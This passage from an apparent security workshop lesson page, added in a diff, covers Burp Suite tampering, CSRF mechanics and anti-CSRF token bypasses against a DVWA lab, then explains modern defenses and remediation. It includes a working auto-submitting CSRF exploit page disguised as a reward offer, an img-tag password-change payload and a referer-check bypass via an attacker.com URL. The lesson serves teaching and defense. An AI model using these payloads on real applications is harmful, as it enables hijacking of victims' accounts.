+                  <li>Navigate to <strong>Proxy &rarr; Proxy Settings</strong>: Verify listener is active on <code>127.0.0.1:8080</code>.</li>
+                  <li>Configure Firefox using the <strong>FoxyProxy</strong> extension pointing HTTP and HTTPS traffic to <code>127.0.0.1</code> on port <code>8080</code>.</li>
+                  <li>Install Burp's PortSwigger CA Certificate into Firefox (<code>http://burpsuite/cert</code>) to seamlessly decrypt SSL/TLS HTTPS packets without browser security alerts.</li>
+                </ol>
+
+                <!-- 6. Intercepting & Modifying HTTP Traffic -->
+                <h2 id="http-traffic-tampering">6. Intercepting &amp; Modifying HTTP Traffic</h2>
+                <p>
+                  With <strong>Proxy &rarr; Intercept is on</strong> enabled, every HTTP interaction pauses in Burp Suite. This unlocks deep capabilities:
+                </p>
+                <ul>
+                  <li><strong>Bypassing Frontend JavaScript Validation:</strong> Client-side checks (such as HTML5 <code>required</code>, <code>maxlength="10"</code>, or regex field validations) only exist in the user's browser. Once intercepted in Burp, any field value can be expanded, replaced with SQL injection strings, or appended with shell characters.</li>
+                  <li><strong>Header Tampering:</strong> Modifying <code>User-Agent</code>, <code>Referer</code>, <code>Host</code>, <code>Cookie</code>, or injecting custom security headers like <code>X-Forwarded-For</code>.</li>
+                  <li><strong>Parameter Tampering:</strong> Altering hidden form parameters, prices (e.g., <code>amount=999</code> changed to <code>amount=1</code>), user roles (e.g., <code>role=user</code> to <code>role=admin</code>), or session identifiers.</li>
+                </ul>
+
+                <!-- 7. Understanding CSRF -->
+                <h2 id="csrf-mechanics">7. Understanding CSRF (Cross-Site Request Forgery)</h2>
+                <p>
+                  <strong>Cross-Site Request Forgery</strong> (classified under <strong>CWE-352</strong>) is an attack that forces an authenticated end-user into executing unwanted actions on a web application in which they are currently logged in.
+                </p>
+                <p>
+                  Because browsers automatically attach session cookies (such as <code>PHPSESSID</code>) with every outbound cross-origin request made to a target domain, the vulnerable server cannot inherently differentiate between:
+                </p>
+                <ol>
+                  <li>A legitimate request initiated intentionally by the user from the actual site.</li>
+                  <li>A malicious request triggered surreptitiously by third-party malicious code (e.g., an attacker-controlled website, phishing email, or iframe).</li>
+                </ol>
+
+                <div class="callout-box">
+                  <strong>The 3 Necessary Conditions for CSRF:</strong>
+                  <br>1. <strong>A Relevant Action:</strong> An action within the application that has security impact (e.g., updating user email, resetting passwords, transferring bank funds).
+                  <br>2. <strong>Cookie-Based Session Handling:</strong> The application relies solely on HTTP cookies to validate the caller identity without multi-factor authorization.
+                  <br>3. <strong>No Unpredictable Request Parameters:</strong> The request structure is completely predictable; there are no secret, unpredictable anti-CSRF tokens validating origin authenticity.
+                </div>
+
+                <!-- 8. Method Conversion: Changing GET to POST in Burp -->
+                <h2 id="get-to-post">8. Method Conversion: Changing GET to POST in Burp</h2>
+                <p>
+                  In our DVWA lab session at <code>http://192.168.1.146/dvwa/vulnerabilities/csrf/</code>, changing passwords sends the following HTTP GET request:
+                </p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Original Captured GET Request (Burp Suite)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">GET /dvwa/vulnerabilities/csrf/?password_new=test123&amp;password_conf=test123&amp;Change=Change HTTP/1.1</span><br>
+                    Host: 192.168.1.146<br>
+                    Upgrade-Insecure-Requests: 1<br>
+                    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36<br>
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>
+                    Referer: http://192.168.1.146/dvwa/vulnerabilities/csrf/<br>
+                    Accept-Encoding: gzip, deflate, br<br>
+                    Accept-Language: en-US,en;q=0.9<br>
+                    Cookie: security=low; PHPSESSID=9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d<br>
+                    Connection: keep-alive
+                  </div>
+                </div>
+
+                <h3>Why GET-Based State Changes are Terribly Insecure</h3>
+                <p>
+                  RFC 7231 specifies that <strong>GET requests must be idempotent and safe</strong>—they should only retrieve data, never modify system state! When an application changes user passwords over a GET request:
+                </p>
+                <ul>
+                  <li>Sensitive credentials appear in browser history and server access logs in plaintext.</li>
+                  <li>Vulnerable to image tag exploitation: An attacker doesn't even need JavaScript! A simple HTML image tag <code>&lt;img src="http://192.168.1.146/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change"&gt;</code> immediately triggers the password change as soon as the victim opens the page!</li>
+                </ul>
+
+                <h3>How to Convert GET to POST in Burp Suite</h3>
+                <p>
+                  In Burp Suite Repeater or Proxy, you can transform request methods instantly:
+                </p>
+                <ol>
+                  <li>Right-click anywhere inside the raw HTTP request body.</li>
+                  <li>Click <strong>"Change request method"</strong>.</li>
+                  <li>Burp Suite automatically handles all protocol requirements:
+                    <ul>
+                      <li>The verb changes from <code>GET</code> to <code>POST</code>.</li>
+                      <li>The query parameters (<code>?password_new=test123&amp;password_conf=test123&amp;Change=Change</code>) are stripped from the URL path.</li>
+                      <li>Burp injects the necessary header: <code>Content-Type: application/x-www-form-urlencoded</code>.</li>
+                      <li>Burp calculates and attaches the <code>Content-Length: 48</code> header.</li>
+                      <li>The parameters are relocated into the HTTP request payload body.</li>
+                    </ul>
+                  </li>
+                </ol>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Converted POST Request (Burp Suite)</span>
+                  </div>
+                  <div class="terminal-body">
+                    <span class="prompt-symbol">POST /dvwa/vulnerabilities/csrf/ HTTP/1.1</span><br>
+                    Host: 192.168.1.146<br>
+                    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36<br>
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>
+                    Referer: http://192.168.1.146/dvwa/vulnerabilities/csrf/<br>
+                    Content-Type: application/x-www-form-urlencoded<br>
+                    Content-Length: 48<br>
+                    Cookie: security=low; PHPSESSID=9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d<br>
+                    Connection: keep-alive<br>
+                    <br>
+                    password_new=test123&amp;password_conf=test123&amp;Change=Change
+                  </div>
+                </div>
+
+                <!-- 9. Anti-CSRF Token Analysis & Bypass Vectors -->
+                <h2 id="csrf-token-bypass">9. Anti-CSRF Token Analysis &amp; Bypass Vectors</h2>
+                <p>
+                  To defend against CSRF, modern web applications generate cryptographically random, unpredictable <strong>anti-CSRF tokens</strong> (also called Synchronizer Tokens) tied to the user's active session. In DVWA High security, every password change form contains a hidden token:
+                </p>
+                <pre><code>&lt;input type="hidden" name="user_token" value="e0f8c2b7d5a491e3f8901b2a4c6e7f89" /&gt;</code></pre>
+
+                <h3>Common Developer Implementation Flaws &amp; Bypass Techniques</h3>
+                <div class="table-responsive">
+                  <table class="table table-bordered table-striped align-middle">
+                    <thead class="table-dark">
+                      <tr>
+                        <th>Vulnerability Pattern</th>
+                        <th>Flaw Explanation</th>
+                        <th>Exploitation / Bypass Method</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Validation depends on token presence</strong></td>
+                        <td>The server checks the token <em>only if</em> the <code>user_token</code> parameter exists in the request body.</td>
+                        <td>In Burp Suite, simply delete the entire <code>&amp;user_token=...</code> parameter from the request. If the server only executes <code>if(isset($_POST['user_token'])) { validate(); }</code>, removing it allows the action to succeed without a token!</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Validation depends on HTTP Method</strong></td>
+                        <td>The backend enforces CSRF token checks on <code>POST</code> requests, but blindly executes the action if sent via <code>GET</code>.</td>
+                        <td>Use Burp Suite's <strong>"Change request method"</strong> to convert the POST request into a GET request. If the server uses PHP's <code>$_REQUEST</code> superglobal, the action executes while skipping POST token verification.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Token is not tied to user session</strong></td>
+                        <td>The application maintains a pool of valid tokens or only verifies that the token was issued by the server, without tying it to the specific user's session cookie.</td>
+                        <td>The attacker logs into their own account, extracts a fresh valid token, and inserts their token into the CSRF exploit delivered to the victim.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Token tied to non-session cookie (Double Submit Cookie)</strong></td>
+                        <td>The server compares the submitted form token with a cookie value (e.g., <code>csrf_cookie=abc</code>).</td>
+                        <td>If the attacker can find a sub-domain cookie-tossing vulnerability or CRLF injection, they can overwrite the victim's cookie with their known value and submit the matching form token.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Referer Header Validation Flaw (DVWA Medium)</strong></td>
+                        <td>The server only checks if the <code>Referer</code> header contains the server's domain string.</td>
+                        <td>In DVWA Medium, the backend checks: <code>stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'])</code>. An attacker can host an exploit on <code>http://attacker.com/192.168.1.146.html</code>; because the IP appears in the referer string, the check passes!</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <!-- 10. Weaponizing CSRF PoCs with csrfshark.github.io -->
+                <h2 id="csrfshark-poc">10. Weaponizing CSRF PoCs with csrfshark.github.io</h2>
+                <p>
+                  While Burp Suite Professional features a built-in <em>"Generate CSRF PoC"</em> engagement tool, security researchers using Burp Suite Community Edition utilize web-based generator engines such as:
+                </p>
+                <div class="callout-box">
+                  <strong><i class="bi bi-link-45deg"></i> Automated Tool Reference:</strong>
+                  <a href="https://csrfshark.github.io/" target="_blank" rel="noopener noreferrer" class="fw-bold text-decoration-underline">https://csrfshark.github.io/</a>
+                  <p class="mb-0 mt-1 small text-muted">
+                    CSRFShark is an open-source CSRF PoC generation utility that converts captured raw HTTP requests into auto-submitting HTML/JavaScript exploit templates.
+                  </p>
+                </div>
+
+                <h3>Step-by-Step PoC Generation Workflow</h3>
+                <p><span class="step-badge">1</span> <strong>Capture Request:</strong> In Burp Suite Proxy or Repeater, copy the complete raw HTTP request targeting <code>/dvwa/vulnerabilities/csrf/</code>.</p>
+                <p><span class="step-badge">2</span> <strong>Input into CSRFShark:</strong> Navigate to <code>https://csrfshark.github.io/</code> and paste the raw request into the input editor.</p>
+                <p><span class="step-badge">3</span> <strong>Select Submission Strategy:</strong> Configure whether the PoC should use hidden form auto-submit via JavaScript (<code>document.forms[0].submit()</code>) or XMLHttpRequest / Fetch with credentials.</p>
+                <p><span class="step-badge">4</span> <strong>Generate Weaponized HTML:</strong> CSRFShark generates the following clean HTML PoC payload:</p>
+
+                <div class="terminal-window">
+                  <div class="terminal-header">
+                    <span class="terminal-circle tc-red"></span>
+                    <span class="terminal-circle tc-yellow"></span>
+                    <span class="terminal-circle tc-green"></span>
+                    <span class="terminal-title">Weaponized CSRF Proof-of-Concept (exploit.html)</span>
+                  </div>
+                  <div class="terminal-body">
+                    &lt;!DOCTYPE html&gt;<br>
+                    &lt;html&gt;<br>
+                    &lt;head&gt;<br>
+                    &nbsp;&nbsp;&lt;title&gt;Special Reward - Claim Now!&lt;/title&gt;<br>
+                    &lt;/head&gt;<br>
+                    &lt;body&gt;<br>
+                    &nbsp;&nbsp;&lt;h1&gt;Loading your special promotion, please wait...&lt;/h1&gt;<br>
+                    &nbsp;&nbsp;&lt;!-- Hidden Exploit Form Targeting DVWA --&gt;<br>
+                    &nbsp;&nbsp;&lt;form id="csrfForm" action="http://192.168.1.146/dvwa/vulnerabilities/csrf/" method="GET"&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="password_new" value="hacked123" /&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="password_conf" value="hacked123" /&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&lt;input type="hidden" name="Change" value="Change" /&gt;<br>
+                    &nbsp;&nbsp;&lt;/form&gt;<br>
+                    <br>
+                    &nbsp;&nbsp;&lt;script&gt;<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;// Auto-submit the malicious form immediately upon loading<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;document.getElementById('csrfForm').submit();<br>
+                    &nbsp;&nbsp;&lt;/script&gt;<br>
+                    &lt;/body&gt;<br>
+                    &lt;/html&gt;
+                  </div>
+                </div>
+
+                <p>
+                  <strong>Simulating the Attack:</strong> When an authenticated victim currently logged into DVWA opens <code>exploit.html</code> (hosted on an attacker's web server or sent via a phishing link), the browser automatically submits the form to <code>http://192.168.1.146/dvwa/vulnerabilities/csrf/</code>, attaching the victim's legitimate <code>PHPSESSID</code> cookie. The victim's password is reset to <code>hacked123</code> without their consent or knowledge!
+                </p>
+
+                <!-- 11. Why Labs Behave Differently than Production -->
+                <h2 id="lab-vs-production">11. Why Labs Behave Differently than Production</h2>
+                <p>
+                  During the BugXploit workshop session, students observed that CSRF attacks in older practice targets like DVWA execute effortlessly, whereas replicating the exact same exploit against modern 2026 production web applications often fails. Understanding these differences is crucial for professional penetration testers:
+                </p>
+
+                <div class="table-responsive">
+                  <table class="table table-bordered table-striped align-middle">
+                    <thead class="table-dark">
+                      <tr>
+                        <th>Defense Mechanism</th>
+                        <th>Old Lab Environment (DVWA / Metasploitable 2)</th>
+                        <th>Modern Production Environments (2026 Standards)</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                      <tr>
+                        <td><strong>Cookie <code>SameSite</code> Attribute</strong></td>
+                        <td>Session cookies are set without a <code>SameSite</code> attribute: <code>Set-Cookie: PHPSESSID=xyz; path=/</code>.</td>
+                        <td>Browsers default to <strong><code>SameSite=Lax</code></strong>. Cross-origin POST requests and state-changing requests do NOT include cookies unless explicitly set to <code>SameSite=None; Secure</code>.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Cross-Origin Resource Sharing (CORS) &amp; Preflight</strong></td>
+                        <td>Traditional HTML form submissions ignore CORS policies; simple requests execute directly.</td>
+                        <td>Modern Single Page Applications (SPAs with React, Angular, Vue) communicate via <code>fetch()</code> or <code>axios</code> with <code>Content-Type: application/json</code>. Browsers fire an HTTP <code>OPTIONS</code> preflight check that blocks unauthorized cross-origin requests.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Framework-Level CSRF Protection</strong></td>
+                        <td>Custom legacy PHP code with no built-in protection unless manually written by developer.</td>
+                        <td>Modern frameworks (Laravel, Django, Ruby on Rails, Spring Boot, ASP.NET Core) generate, inject, and validate cryptographically secure anti-CSRF tokens by default across all forms and AJAX calls.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>WAF / IDS Filters</strong></td>
+                        <td>Disabled by default (DVWA includes optional PHPIDS, but it is turned off in standard setups).</td>
+                        <td>Cloudflare, AWS WAF, Akamai, and Imperva inspect request body patterns, referer headers, and automated user-agent behaviors, triggering immediate CAPTCHAs or 403 Forbidden blocks.</td>
+                      </tr>
+                      <tr>
+                        <td><strong>Re-Authentication on Sensitive Actions</strong></td>
+                        <td>Password changes require only the new password; no current password prompt exists.</td>
+                        <td>Zero-Trust pattern: Changing email or password requires entering the <strong>Current Password</strong> or verifying through an out-of-band Multi-Factor Authentication (MFA) push notification or OTP.</td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </div>
+
+                <!-- 12. Defense & Remediation -->
+                <h2 id="defense-remediation">12. Hardening &amp; Defensive Countermeasures</h2>
+
+                <h3>Remediating OS Command Injection</h3>
+                <ul>
+                  <li><strong>Avoid Shell Execution Sinks:</strong> Never pass user input into <code>shell_exec()</code>, <code>system()</code>, <code>exec()</code>, or backticks. Most administrative tasks (pinging, network checks, file operations) have native language APIs or libraries.</li>
+                  <li><strong>Escaping Shell Arguments:</strong> If external execution is unavoidable, use <code>escapeshellcmd()</code> and <code>escapeshellarg()</code> in PHP to neutralize metacharacters:
+                    <pre><code>$clean_ip = escapeshellarg( $user_ip );
+$output = shell_exec( "ping -c 4 " . $clean_ip );</code></pre>
+                  </li>
+                  <li><strong>Strict Input Whitelisting:</strong> Validate that the incoming parameter matches a strict expected format (e.g., IPv4 regex <code>/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/</code>) before processing.</li>
+                  <li><strong>Principle of Least Privilege:</strong> Run the web server service under a non-root, restricted user account (e.g., <code>www-data</code>) with strict <code>sudoers</code> rules and directory read-only flags.</li>
+                </ul>
+
+                <h3>Remediating Cross-Site Request Forgery</h3>
+                <ul>
+                  <li><strong>Synchronizer Token Pattern (STP):</strong> Generate unique, cryptographically secure, unpredictable anti-CSRF tokens for each user session. Validate tokens on every state-changing HTTP method (POST, PUT, DELETE, PATCH).</li>
+                  <li><strong>Enforce <code>SameSite=Strict</code> or <code>SameSite=Lax</code> Cookies:</strong>
+                    <pre><code>Set-Cookie: session_id=xyz89; Secure; HttpOnly; SameSite=Strict</code></pre>
+                    <code>Strict</code> ensures the cookie is never sent with cross-site requests, completely mitigating CSRF attacks.
+                  </li>
+                  <li><strong>Require Current Password / Re-Authentication:</strong> Sensitive operations (password updates, email changes, fund transfers) must mandate re-entry of the existing password or MFA confirmation.</li>
+                  <li><strong>Custom Request Headers:</strong> For API endpoints, require custom headers such as <code>X-Requested-With: XMLHttpRequest</code> or custom bearer tokens that cannot be set by standard cross-origin HTML forms.</li>
+                </ul>
+
+                <!-- 13. Summary & Key Takeaways -->
+                <h2 id="key-takeaways">13. Day 4 Summary &amp; Key Takeaways</h2>
+                <div class="callout-box">
+                  <ul class="mb-0">
+                    <li><strong>Command Execution Severity:</strong> CWE-78 represents an instant critical vulnerability allowing arbitrary shell execution on the underlying operating system.</li>
+                    <li><strong>Shell Operators:</strong> Metacharacters like <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, and <code>&amp;</code> chain commands together; blacklists that omit any of these characters (like DVWA Medium or High) will inevitably be bypassed.</li>
+                    <li><strong>Proxy Power:</strong> Burp Suite provides complete control over the HTTP request/response lifecycle, bypassing client-side constraints effortlessly.</li>
+                    <li><strong>GET vs POST in CSRF:</strong> Never use GET requests for state-changing operations. Converting GET to POST in Burp changes the request structure, headers, and body location.</li>
+                    <li><strong>Automated PoC Generation:</strong> Tools like <code>csrfshark.github.io</code> enable researchers to rapidly generate weaponized HTML proof-of-concept exploits for bug bounty submissions.</li>
+                    <li><strong>Real-World Defenses:</strong> Modern defenses like <code>SameSite=Lax/Strict</code> cookie flags, preflight CORS checks, and framework-level anti-CSRF tokens make modern targets far more resilient than legacy practice labs.</li>
+                  </ul>
+                </div>
+
+                <!-- Ethical Use & Legal Warning Notice -->
+                <div
+                  class="p-3 my-4 rounded border border-danger bg-danger bg-opacity-10 d-flex align-items-start gap-3">
+                  <div class="text-danger fs-2" style="line-height: 1;">
+                    <i class="bi bi-exclamation-triangle-fill"></i>
+                  </div>
+                  <div>
+                    <h5 class="fw-bold text-danger mb-1" style="font-size: 16px;">
+                      WARNING: Strictly For Educational &amp; Defensive Purposes Only
+                    </h5>
+                    <p class="mb-0 text-dark small" style="line-height: 1.6;">
+                      All command injection testing, Burp Suite request tampering, and CSRF proof-of-concept workflows documented in this report were performed within an isolated, authorized local lab environment (Metasploitable 2 and DVWA). Executing these attacks against unauthorized systems, networks, or public applications without express written permission is illegal under the Electronic Transactions Act (ETA) of Nepal and international cyber law. TheWH2 and BugXploit promote ethical, white-hat offensive and defensive security research.
+                    </p>
+                  </div>
+                </div>
+
+              </div><!-- .article-content -->
+
+              <!-- Bottom Navigation -->
+              <div class="lesson-nav-buttons">
+                <a href="../day3/index.html" class="btn btn-outline-secondary">
+                  <i class="bi bi-arrow-left"></i> Previous: Day 3
+                </a>
+                <a href="../index.html" class="btn btn-primary">
+                  <i class="bi bi-grid-fill"></i> Workshop Overview
+                </a>
+              </div>
+
+            </article>
+
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End Lesson Detailed Content -->
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+    <div class="container">
+      <div class="copyright">
+        &copy; 2026 <strong><span>The WH2</span></strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        Designed with Security by <a href="../../../index.html">The WH2</a>
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
+      class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="../../../assets/vendor/aos/aos.js"></script>
+  <script src="../../../assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="../../../assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="../../../assets/vendor/swiper/swiper-bundle.min.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="../../../assets/js/main.js"></script>
+
+  <!-- Automatic Clipboard Copy Button for all code blocks -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const codeBlocks = document.querySelectorAll('.lesson-article pre');
+
+      codeBlocks.forEach(function (pre) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'code-block-wrapper';
+        pre.parentNode.insertBefore(wrapper, pre);
+        wrapper.appendChild(pre);
+
+        const copyBtn = document.createElement('button');
+        copyBtn.className = 'code-copy-btn';
+        copyBtn.type = 'button';
+        copyBtn.setAttribute('title', 'Copy code to clipboard');
+        copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+
+        copyBtn.addEventListener('click', function () {
+          const codeText = pre.innerText.trim();
+          navigator.clipboard.writeText(codeText).then(function () {
+            copyBtn.classList.add('copied');
+            copyBtn.innerHTML = '<i class="bi bi-check-lg"></i>';
+            setTimeout(function () {
+              copyBtn.classList.remove('copied');
+              copyBtn.innerHTML = '<i class="bi bi-clipboard"></i>';
+            }, 2000);
+          }).catch(function (err) {
+            console.error('Failed to copy: ', err);
+          });
+        });
+
+        wrapper.appendChild(copyBtn);
+      });
+    });
+  </script>
+
+</body>
+
+</html>
